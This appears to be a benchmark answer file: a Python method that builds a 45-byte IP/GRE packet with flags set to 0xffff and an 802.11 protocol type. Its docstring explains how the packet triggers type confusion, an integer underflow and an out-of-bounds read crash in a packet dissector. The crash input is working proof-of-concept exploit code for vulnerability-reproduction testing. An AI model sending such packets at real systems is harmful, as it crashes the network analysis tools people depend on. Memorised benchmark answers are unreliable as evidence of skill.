import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generates a PoC that triggers the vulnerability.

        The vulnerability stems from a type confusion issue. The GRE dissector passes a
        pointer to a 2-byte stack variable (`flags_and_version`) to its subdissectors.
        When the 802.11 dissector is invoked via the `gre.proto` table, it treats this
        pointer as a pseudo-header of type `ieee80211_pseudo_header_t`, which is a much
        larger structure.

        By controlling the GRE `flags_and_version`, we control the first two bytes the
        802.11 dissector reads. Setting these to `0xffff` causes a field within the
        pseudo-header (e.g., `fcs_len`) to be interpreted as a large value. This value
        is used in a length calculation (`capture_length - fcs_len`), leading to an
        integer underflow. The resulting large, incorrect length is then used for a
        subsequent read from the packet buffer, causing an out-of-bounds read and a crash.

        The PoC is a 45-byte packet composed of:
        1. IP Header (20 bytes): Protocol set to GRE (47).
        2. GRE Header (4 bytes):
           - `flags_and_version`: `\xff\xff` (the malicious value).
           - `protocol type`: `\x88\x73` (ETHERTYPE_WLAN), which dispatches to the
             vulnerable 802.11 dissector.
        3. Payload (21 bytes): The content is not critical; the crash occurs before it's parsed.
        """

        def ip_checksum(data: bytes) -> bytes:
            if len(data) % 2:
                data += b'\0'

            s = 0
            for i in range(0, len(data), 2):
                s += (data[i] << 8) + data[i+1]

            while (s >> 16):
                s = (s & 0xffff) + (s >> 16)

            s = ~s & 0xffff
            return struct.pack('>H', s)

        # IP Header (20 bytes)
        ip_header_parts = [
            b'\x45\x00',              # Version(4), IHL(5), ToS
            struct.pack('>H', 45),    # Total Length: 20 IP + 4 GRE + 21 Payload
            b'\xde\xad',              # Identification
            b'\x40\x00',              # Flags (DF), Fragment Offset
            b'\x40',                  # TTL
            b'\x2f',                  # Protocol: GRE (47)
            b'\x00\x00',              # Header Checksum (placeholder)
            b'\x7f\x00\x00\x01',      # Source IP
            b'\x7f\x00\x00\x01',      # Destination IP
        ]

        header_to_checksum = b''.join(ip_header_parts[0:6] + ip_header_parts[7:])
        checksum = ip_checksum(header_to_checksum)
        ip_header_parts[6] = checksum
        ip_header = b''.join(ip_header_parts)

        # GRE Header (4 bytes)
        # Flags/Version (0xffff) + Proto (0x8873 for WLAN)
        gre_header = b'\xff\xff\x88\x73'

        # Payload (21 bytes)
        payload = b'\x00' * 21

        poc = ip_header + gre_header + payload

        return poc